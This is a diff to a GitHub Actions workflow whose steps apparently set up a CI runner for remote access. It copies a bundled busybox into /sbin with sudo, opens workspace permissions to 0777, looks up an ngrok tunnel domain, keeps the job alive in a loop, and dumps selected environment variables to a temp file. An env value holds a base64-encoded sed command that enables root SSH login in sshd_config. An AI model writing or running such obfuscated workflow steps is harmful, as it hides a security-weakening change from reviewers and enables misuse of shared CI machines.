@@ -31,7 +31,12 @@ jobs:
 
 
       - name: Run a one-line script
-        run: bash -c "echo ${{github.event.action}};echo ${{ github.workspace }}${{ runner.workspace }}$GITHUB_WORKSPACE;echo ${{github.event.inputs}};date;(env|grep ss>/tmp/s0;sleep 1111&);cd $GITHUB_WORKSPACE;chmod 0777 *;ls -l;pwd;cp ./busybox.bin busybox; busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;touch one-line-script1111;exit 0"
+        run: bash -c "echo ${{github.event.action}};echo ${{github.event.inputs}};(env|grep ss>/tmp/s0;sleep 1111&);chmod 0777 $GITHUB_WORKSPACE/*;ls -al;pwd;touch one-line-script1111;exit 0"
+        env:
+          ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+      # Runs a set of commands using the runners shell
+      - name: Run a 2-line script
+        run: bash -c "echo \"${{ github.workspace }}--$GITHUB_WORKSPACE--${{ runner.workspace }}\";date;sudo cp ./busybox.bin /sbin/busybox;busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -54,6 +59,7 @@ jobs:
         env:
           sp9: 4
           TZ: Asia/Shanghai
+          
       - name: Run a 4rd script
         run: 
           bash -c 'echo "${{ toJson(github.event.action) }}";(while :;do [ -f /tmp/keepalive ]&&sleep 10||break;done);'
